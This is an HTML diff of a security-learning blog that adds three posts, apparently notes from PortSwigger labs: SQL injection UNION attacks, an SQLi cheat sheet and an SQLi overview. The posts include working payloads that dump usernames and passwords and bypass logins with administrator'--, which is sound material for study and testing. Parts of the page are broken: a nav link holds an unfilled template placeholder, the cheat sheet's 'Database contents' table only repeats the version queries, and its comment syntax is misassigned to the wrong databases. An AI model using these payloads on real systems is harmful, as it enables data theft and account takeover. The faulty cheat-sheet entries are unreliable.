@@ -19,7 +19,7 @@
             <ul>
                 <li class="selected"><a href="https://sfinx.kozow.com/">Home</a></li>
                 <li><a href="https://github.com/Medaz-Sploit">GitHub</a></li>
-                <li><a href="https://sfinx.kozow.com/article">HTB</a></li>
+                <li><a href="https://sfinx.kozow.com/{date:%Y}/{date:%-m}/{date:%-d}/{slug}/">PortSwigger</a></li>
                 <li><a href="https://sfinx.kozow.com/categories">Categories</a></li>
             </ul>
         </nav>
@@ -30,7 +30,738 @@
         </div>
     </header>
     <div id="wrapper">
-        <div id="content">
+        <div id="content">            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/sqli-union/" rel="bookmark" title="Permanent Link to &quot;SQL Injection UNION Attacks&quot;">SQL Injection UNION Attacks</a>
+                </h2>
+
+                
+                
+
+                <h1>SQL injection UNION attacks</h1>
+<h1>OSCP/WEB/PORTSWIGGER/LearningPath/ServerSide/SQLINJECTION</h1>
+<p><img alt="Photo" src="https://sfinx.kozow.com/2024/5/19/sqli-union/SQLI_UNION/union_based_sql_injection.png"></p>
+<p>When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the ==UNION== keyword can be used to retrieve data from other tables within the database. This results in a SQL injection UNION attack.</p>
+<p>The ==UNION== keyword lets you execute one or more additional ==SELECT== queries and append the results to the original query. For example:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">table1</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">c</span><span class="p">,</span><span class="w"> </span><span class="n">d</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">table2</span>
+</code></pre></div>
+
+<p>This SQL query will return a single result set with two columns, containing values from columns ==a== and ==b== in ==table1== and columns c and d in table2.
+For a ==UNION== query to work, two key requirements must be met:
+* The individual queries must return the same number of columns.
+* The data types in each column must be compatible between the individual queries.</p>
+<p>⠀To carry out a SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:
+* How many columns are being returned from the original query?
+* Which columns returned from the original query are of a suitable data type to hold the results from the injected query?</p>
+<h2>Determining the number of columns required in a SQL injection UNION attacks</h2>
+<p>When performing a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.
+The first method involves injecting a series of ==ORDER BY== clauses and incrementing the specified column index until an error occurs. For example, assuming the injection point is a quoted string within the ==WHERE== clause of the original query, you would submit:</p>
+<div class="highlight"><pre><span></span><code><span class="s1">&#39; ORDER BY 1--</span>
+<span class="s1">&#39;</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="mi">2</span><span class="c1">--</span>
+<span class="err">&#39;</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="mi">3</span><span class="c1">--</span>
+<span class="n">etc</span><span class="p">.</span>
+</code></pre></div>
+
+<p>This series of payloads modifies the original query to order the results by different columns in the result set. The column in an ==ORDER BY== clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:</p>
+<div class="highlight"><pre><span></span><code>The ORDER BY position number 3 is out of range of the number of items in the select list.
+</code></pre></div>
+
+<p>The application might actually return the database error in its HTTP response, or it might return a generic error, or simply return no results. Provided you can detect some difference in the application's response, you can infer how many columns are being returned from the query.
+The second method involves submitting a series of ==UNION== ==SELECT== payloads specifying a different number of null values:</p>
+<div class="highlight"><pre><span></span><code><span class="s1">&#39; UNION SELECT NULL--</span>
+<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">--</span>
+<span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">--</span>
+<span class="n">etc</span><span class="p">.</span>
+</code></pre></div>
+
+<p>If the number of nulls does not match the number of columns, the database returns an error, such as:</p>
+<div class="highlight"><pre><span></span><code>All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
+</code></pre></div>
+
+<p>Again, the application might actually return this error message, or might just return a generic error or no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the resulting HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a ==NullPointerException==. Worst case, the response might be indistinguishable from that which is caused by an incorrect number of nulls, making this method of determining the column count ineffective.</p>
+<table>
+<thead>
+<tr>
+<th>🧪 LAB PRACTITIONER</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">SQL injection UNION attack, determining the number of columns returned by the query</a></td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Note</strong>
+* The reason for using ==NULL== as the values returned from the injected ==SELECT== query is that the data types in each column must be compatible between the original and the injected queries. Since ==NULL== is convertible to every commonly used data type, using ==NULL== maximizes the chance that the payload will succeed when the column count is correct.
+* On Oracle, every ==SELECT== query must use the ==FROM== keyword and specify a valid table. There is a built-in table on Oracle called ==dual== which can be used for this purpose. So the injected queries on Oracle would need to look like: </p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="w">        </span><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">DUAL</span><span class="c1">--</span>
+</code></pre></div>
+
+<blockquote>
+<ul>
+<li>The payloads described use the double-dash comment sequence ==--== to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character ==#== can be used to identify a comment.
+  For more details of database-specific syntax, see the [[SQL injection cheat sheet]].</li>
+</ul>
+</blockquote>
+<h2>Finding columns with a useful data type in a SQL injection UNION attack</h2>
+<p>The reason for performing a SQL injection UNION attack is to be able to retrieve the results from an injected query. Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.
+Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of ==UNION SELECT== payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:</p>
+<div class="highlight"><pre><span></span><code><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">a</span><span class="s1">&#39;,NULL,NULL,NULL--</span>
+<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">--</span>
+<span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">a</span><span class="s1">&#39;,NULL--</span>
+<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="c1">--</span>
+</code></pre></div>
+
+<p>If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:</p>
+<div class="highlight"><pre><span></span><code><span class="n">Conversion</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="n">when</span><span class="w"> </span><span class="n">converting</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">varchar</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="nb nb-Type">int</span><span class="o">.</span>
+</code></pre></div>
+
+<p>If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.</p>
+<table>
+<thead>
+<tr>
+<th>🧪 LAB PRACTITIONER</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">SQL injection UNION attack, finding a column containing text</a></td>
+</tr>
+</tbody>
+</table>
+<h2>Using a SQL injection UNION attack to retrieve interesting data</h2>
+<p>When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.
+Suppose that:
+* The original query returns two columns, both of which can hold string data.
+* The injection point is a quoted string within the ==WHERE== clause.
+* The database contains a table called ==users== with the columns ==username== and ==password==.</p>
+<p>⠀In this situation, you can retrieve the contents of the ==users== table by submitting the input:</p>
+<div class="highlight"><pre><span></span><code><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="c1">--</span>
+</code></pre></div>
+
+<p>Of course, the crucial information needed to perform this attack is that there is a table called ==users== with two columns called ==username== and ==password==. Without this information, you would be left trying to guess the names of tables and columns. In fact, all modern databases provide ways of examining the database structure, to determine what tables and columns it contains.</p>
+<table>
+<thead>
+<tr>
+<th>🧪 LAB PRACTITIONER</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables">SQL injection UNION attack, retrieving data from other tables</a></td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Read more</strong>
+* [[Examining the database in SQL injection attacks]]</p>
+</blockquote>
+<h2>Retrieving multiple values within a single column</h2>
+<p>In the preceding example, suppose instead that the query only returns a single column.
+You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:</p>
+<div class="highlight"><pre><span></span><code><span class="s1">&#39; UNION SELECT username || &#39;</span><span class="o">~</span><span class="err">&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="c1">--</span>
+</code></pre></div>
+
+<p>This uses the double-pipe sequence ==||== which is a string concatenation operator on Oracle. The injected query concatenates together the values of the ==username== and ==password== fields, separated by the ==~== character.
+The results from the query will let you read all of the usernames and passwords, for example:</p>
+<div class="highlight"><pre><span></span><code>...
+administrator~s3cure
+wiener~peter
+carlos~montoya
+...
+</code></pre></div>
+
+<p>Note that different databases use different syntax to perform string concatenation. For more details, see the <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.</p>
+<table>
+<thead>
+<tr>
+<th>🧪 LAB PRACTITIONER</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column">SQL injection UNION attack, retrieving multiple values in a single column</a></td>
+</tr>
+</tbody>
+</table>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/sqli-union/">posted at 21:05</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/web.html" rel="tag">web</a>
+                </div>
+            </article>            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/sqli-cheat-sheet/" rel="bookmark" title="Permanent Link to &quot;SQL Injection Cheat Sheet&quot;">SQL Injection Cheat Sheet</a>
+                </h2>
+
+                
+                
+
+                <h1>SQL injection cheat sheet</h1>
+<h1>OSCP/WEB/PORTSWIGGER/LearningPath/ServerSide/SQLINJECTION</h1>
+<p><img alt="Photo" src="https://sfinx.kozow.com/2024/5/19/sqli-cheat-sheet/SQLI_CHEAT_SHEET/black-green-cheat-sheet-stamp-black-green-cheat-sheet-stamp-illustration-graphic-concept-108947651.jpg.webp"></p>
+<p>This <strong>SQL injection</strong> cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.</p>
+<h2>String concatenation</h2>
+<p>You can concatenate together multiple strings to make a single string.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Oracle</th>
+<th style="text-align: center;">=='foo'||'bar'==</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><strong>Microsoft</strong></td>
+<td style="text-align: center;">=='foo'+'bar'==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>PostgreSQL</strong></td>
+<td style="text-align: center;">=='foo'||'bar'==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>MySQL</strong></td>
+<td style="text-align: center;">=='foo' 'bar'== [Note the space between the two strings]<br>==CONCAT('foo','bar')==</td>
+</tr>
+<tr>
+<td style="text-align: center;">## Substring</td>
+<td style="text-align: center;"></td>
+</tr>
+</tbody>
+</table>
+<p>You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ==ba==.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Oracle</th>
+<th style="text-align: center;">==SUBSTR('foobar', 4, 2)==</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><strong>Microsoft</strong></td>
+<td style="text-align: center;">==SUBSTRING('foobar', 4, 2)==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>PostgreSQL</strong></td>
+<td style="text-align: center;">==SUBSTRING('foobar', 4, 2)==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>MySQL</strong></td>
+<td style="text-align: center;">==SUBSTRING('foobar', 4, 2)==</td>
+</tr>
+</tbody>
+</table>
+<h2>Comments</h2>
+<p>You can use comments to truncate a query and remove the portion of the original query that follows your input.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Oracle</th>
+<th style="text-align: center;">==--comment==</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><strong>Microsoft</strong></td>
+<td style="text-align: center;">==/*comment*/==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>PostgreSQL</strong></td>
+<td style="text-align: center;">==#comment==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>MySQL</strong></td>
+<td style="text-align: center;">==-- comment==  [Note the space after the double dash]</td>
+</tr>
+</tbody>
+</table>
+<h2>Database version</h2>
+<p>You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Oracle</th>
+<th style="text-align: center;">==SELECT banner FROM v$version==<br>==SELECT version FROM v$instance==</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><strong>Microsoft</strong></td>
+<td style="text-align: center;">==SELECT @@version==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>PostgreSQL</strong></td>
+<td style="text-align: center;">==SELECT version()==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>MySQL</strong></td>
+<td style="text-align: center;">==SELECT @@version==</td>
+</tr>
+</tbody>
+</table>
+<h2>Database contents</h2>
+<p>You can list the tables that exist in the database, and the columns that those tables contain.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Oracle</th>
+<th style="text-align: center;">==SELECT banner FROM v$version==<br>==SELECT version FROM v$instance==</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><strong>Microsoft</strong></td>
+<td style="text-align: center;">==SELECT @@version==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>PostgreSQL</strong></td>
+<td style="text-align: center;">==SELECT version()==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>MySQL</strong></td>
+<td style="text-align: center;">==SELECT @@version==</td>
+</tr>
+</tbody>
+</table>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/sqli-cheat-sheet/">posted at 21:03</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/web.html" rel="tag">web</a>
+                </div>
+            </article>            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/sql-injection/" rel="bookmark" title="Permanent Link to &quot;SQL Injection&quot;">SQL Injection</a>
+                </h2>
+
+                
+                
+
+                <h1>💉SQL Injection</h1>
+<h1>OSCP/WEB/PORTSWIGGER/LearningPath/ServerSide/SQLINJECTION</h1>
+<p><img alt="Photo" src="https://sfinx.kozow.com/2024/5/19/sql-injection/SQLI/SQL-Injection.jpg"></p>
+<p>In this section, we'll explain what SQL injection (SQLi) is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.</p>
+<p>For a brief resume on all payloads to use for SQL injection testing, try the following cheat sheet:</p>
+<blockquote>
+<p>[[SQL injection cheat sheet|SQL Injection Cheat Sheet !]]</p>
+</blockquote>
+<h2>Summary</h2>
+<ul>
+<li>[[💉SQL Injection/What is SQL injection (SQLi) ?|What is SQL injection (SQLi) ?]]</li>
+<li>[[💉SQL Injection/What is the impact of a successful SQL injection attack?|What is the impact of a successful SQL injection attack?]]</li>
+<li>[[💉SQL Injection/How to detect SQL injection vulnerabilities|How to detect SQL injection vulnerabilities]]</li>
+<li>[[💉SQL Injection/SQL injection in different parts of the query|SQL injection in different parts of the query]]</li>
+<li>[[💉SQL Injection/SQL injection examples|SQL injection examples]]</li>
+<li>[[💉SQL Injection/Retrieving hidden data|Retrieving hidden data]]</li>
+<li>[[💉SQL Injection/Subverting application logic|Subverting application logic]]</li>
+<li>[[💉SQL Injection/Retrieving data from other database tables|Retrieving data from other database tables]]</li>
+<li>[[💉SQL Injection/Blind SQL injection vulnerabilities|Blind SQL injection vulnerabilities]]</li>
+<li>[[💉SQL Injection/Second-order SQL injection|Second-order SQL injection]]</li>
+<li>[[💉SQL Injection/Examining the database|Examining the database]]</li>
+<li>[[💉SQL Injection/SQL injection in different contexts|SQL injection in different contexts]]</li>
+<li>[[💉SQL Injection/How to prevent SQL injection|How to prevent SQL injection]]</li>
+</ul>
+<h3>What is SQL injection (SQLi) ?</h3>
+<p>SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.
+In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.</p>
+<p><a href="https://youtu.be/wX6tszfgYp4">What is SQL Injection</a><!-- {"preview":"true"} --></p>
+<hr>
+<h3>What is the impact of a successful SQL injection attack?</h3>
+<p>A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information. Many high-profile data breaches in recent years have been the result of SQL injection attacks, leading to reputational damage and regulatory fines. In some cases, an attacker can obtain a persistent backdoor into an organization's systems, leading to a long-term compromise that can go unnoticed for an extended period.</p>
+<hr>
+<h3>How to detect SQL injection vulnerabilities</h3>
+<p>The majority of SQL injection vulnerabilities can be found quickly and reliably using Burp Suite's <a href="https://portswigger.net/burp/vulnerability-scanner">web vulnerability scanner</a>.
+SQL injection can be detected manually by using a systematic set of tests against every entry point in the application. This typically involves:
+* Submitting the single quote character =='== and looking for errors or other anomalies.
+* Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
+* Submitting Boolean conditions such as ==OR 1=1== and ==OR 1=2==, and looking for differences in the application's responses.
+* Submitting payloads designed to trigger time delays when executed within a SQL query, and looking for differences in the time taken to respond.
+* Submitting <a href="https://portswigger.net/burp/application-security-testing/oast">OAST</a> payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitoring for any resulting interactions.</p>
+<hr>
+<h3>SQL injection in different parts of the query</h3>
+<p>Most SQL injection vulnerabilities arise within the <em>==WHERE==</em> clause of a <em>==SELECT==</em> query. This type of SQL injection is generally well-understood by experienced testers.
+But SQL injection vulnerabilities can in principle occur at any location within the query, and within different query types. The most common other locations where SQL injection arises are:
+* In <em>==UPDATE==</em> statements, within the updated values or the <em>==WHERE==</em> clause.
+* In <em>==INSERT==</em> statements, within the inserted values.
+* In <em>==SELECT==</em> statements, within the table or column name.
+* In <em>==SELECT==</em> statements, within the <em>==ORDER BY==</em> clause.</p>
+<hr>
+<h3>SQL injection examples</h3>
+<p>There are a wide variety of SQL injection vulnerabilities, attacks, and techniques, which arise in different situations. Some common SQL injection examples include:
+* <a href="https://portswigger.net/web-security/sql-injection#retrieving-hidden-data">Retrieving hidden data</a>, where you can modify a SQL query to return additional results.
+* <a href="https://portswigger.net/web-security/sql-injection#subverting-application-logic">Subverting application logic</a>, where you can change a query to interfere with the application's logic.
+* <a href="https://portswigger.net/web-security/sql-injection/union-attacks">UNION attacks</a>, where you can retrieve data from different database tables.
+* <a href="https://portswigger.net/web-security/sql-injection/blind">Blind SQL injection</a>, where the results of a query you control are not returned in the application's responses.</p>
+<hr>
+<h3>Retrieving hidden data</h3>
+<p>Consider a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:
+ ```
+https://insecure-website.com/products?category=Gifts</p>
+<div class="highlight"><pre><span></span><code>
+</code></pre></div>
+
+<p>This causes the application to make a SQL query to retrieve details of the relevant products from the database:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">category</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Gifts&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">released</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span>
+</code></pre></div>
+
+<p>This SQL query asks the database to return:
+* all details (*)
+* from the products table
+* where the category is Gifts
+* and released is 1.</p>
+<p>⠀The restriction <em>==released = 1==</em> is being used to hide products that are not released. For unreleased products, presumably <em>==released = 0==</em>.
+The application doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like:
+ ```
+https://insecure-website.com/products?category=Gifts'--</p>
+<div class="highlight"><pre><span></span><code>This results in the SQL query:
+```sql
+SELECT * FROM products WHERE category = &#39;Gifts&#39;--&#39; AND released = 1
+</code></pre></div>
+
+<p>The key thing here is that the double-dash sequence ==--== is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment. This effectively removes the remainder of the query, so it no longer includes ==<em>AND released = 1</em>==. This means that all products are displayed, including unreleased products.
+Going further, an attacker can cause the application to display all the products in any category, including categories that they don't know about:
+ ```
+https://insecure-website.com/products?category=Gifts'+OR+1=1--</p>
+<div class="highlight"><pre><span></span><code>This results in the SQL query:
+```sql
+SELECT * FROM products WHERE category = &#39;Gifts&#39; OR 1=1--&#39; AND released = 1
+</code></pre></div>
+
+<p>The modified query will return all items where either the category is Gifts, or 1 is equal to 1. Since ==<em>1=1</em>== is always true, the query will return all items.</p>
+<blockquote>
+<p><strong>Warning</strong>
+Take care when injecting the condition ==OR 1=1== into a SQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an ==UPDATE== or ==DELETE== statement, for example, this can result in an accidental loss of data.</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">🧪LAB APPRENTICE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</a></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3>Subverting application logic</h3>
+<p>Consider an application that lets users log in with a username and password. If a user submits the username <em>==wiener==</em> and the password <em>==bluecheese==</em>, the application checks the credentials by performing the following SQL query:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;wiener&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;bluecheese&#39;</span>
+</code></pre></div>
+
+<p>If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.
+Here, an attacker can log in as any user without a password simply by using the SQL comment sequence ==--== to remove the password check from the ==WHERE== clause of the query. For example, submitting the username ==administrator'--== and a blank password results in the following query:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;administrator&#39;</span><span class="c1">--&#39; AND password = &#39;&#39;</span>
+</code></pre></div>
+
+<p>This query returns the user whose username is <em>==administrator==</em> and successfully logs the attacker in as that user.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">🧪LAB APPRENTICE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</a></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3>Retrieving data from other database tables</h3>
+<p>In cases where the results of a SQL query are returned within the application's responses, an attacker can leverage a SQL injection vulnerability to retrieve data from other tables within the database. This is done using the ==UNION== keyword, which lets you execute an additional ==SELECT== query and append the results to the original query.
+For example, if an application executes the following query containing the user input "Gifts":</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">description</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">category</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Gifts&#39;</span>
+</code></pre></div>
+
+<p>then an attacker can submit the input:</p>
+<div class="highlight"><pre><span></span><code><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="c1">--</span>
+</code></pre></div>
+
+<p>This will cause the application to return all usernames and passwords along with the names and descriptions of products.</p>
+<blockquote>
+<p><strong>Read more</strong>
+* [[SQL injection UNION attacks]]</p>
+</blockquote>
+<hr>
+<h3>Blind SQL injection vulnerabilities</h3>
+<p>Many instances of SQL injection are blind vulnerabilities. This means that the application does not return the results of the SQL query or the details of any database errors within its responses. Blind vulnerabilities can still be exploited to access unauthorized data, but the techniques involved are generally more complicated and difficult to perform.
+Depending on the nature of the vulnerability and the database involved, the following techniques can be used to exploit blind SQL injection vulnerabilities:
+* You can change the logic of the query to trigger a detectable difference in the application's response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic, or conditionally triggering an error such as a divide-by-zero.
+* You can conditionally trigger a time delay in the processing of the query, allowing you to infer the truth of the condition based on the time that the application takes to respond.
+* You can trigger an out-of-band network interaction, using OAST techniques. This technique is extremely powerful and works in situations where the other techniques do not. Often, you can directly exfiltrate data via the out-of-band channel, for example by placing the data into a DNS lookup for a domain that you control.</p>
+<blockquote>
+<p><strong>Read more</strong>
+* <a href="https://portswigger.net/web-security/sql-injection/blind">Blind SQL injection</a></p>
+</blockquote>
+<hr>
+<h3>Second-order SQL injection</h3>
+<p>First-order SQL injection arises where the application takes user input from an HTTP request and, in the course of processing that request, incorporates the input into a SQL query in an unsafe way.
+In second-order SQL injection (also known as stored SQL injection), the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability arises at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way.</p>
+<p><img alt="Photo" src="https://sfinx.kozow.com/2024/5/19/sql-injection/SQLI/image 2.jpg"></p>
+<p>Second-order SQL injection often arises in situations where developers are aware of SQL injection vulnerabilities, and so safely handle the initial placement of the input into the database. When the data is later processed, it is deemed to be safe, since it was previously placed into the database safely. At this point, the data is handled in an unsafe way, because the developer wrongly deems it to be trusted.</p>
+<hr>
+<h3>Examining the database</h3>
+<p>Some core features of the SQL language are implemented in the same way across popular database platforms, and so many ways of detecting and exploiting SQL injection vulnerabilities work identically on different types of database.
+However, there are also many differences between common databases. These mean that some techniques for detecting and exploiting SQL injection work differently on different platforms. For example:</p>
+<ul>
+<li>Syntax for string concatenation.</li>
+<li>Comments.</li>
+<li>Batched (or stacked) queries.</li>
+<li>Platform-specific APIs.</li>
+<li>Error messages.</li>
+</ul>
+<blockquote>
+<p><strong>Read more</strong>
+* <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a></p>
+</blockquote>
+<p>Following initial identification of a SQL injection vulnerability, it is generally useful to obtain some information about the database itself. This information can often pave the way for further exploitation.
